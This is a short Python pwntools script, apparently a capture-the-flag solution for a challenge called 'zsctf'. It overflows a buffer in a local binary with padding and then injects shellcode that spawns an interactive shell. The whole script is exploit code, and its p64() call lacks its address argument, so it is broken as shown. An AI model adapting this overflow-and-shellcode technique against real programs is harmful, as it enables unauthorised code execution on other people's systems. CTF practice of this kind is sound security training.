from pwn import *
import time

bss_addr =0x00404030 
#proc = './e.out'
#context.binary = proc
shellcode = asm(shellcraft.sh())

#p = process(proc)

p = process('./e.out')

p.recvuntil("Welcome to zsctf!\n")


p.send('a' * 0x20 + p64())

time.sleep(1)

p.send(shellcode)

p.interactive()

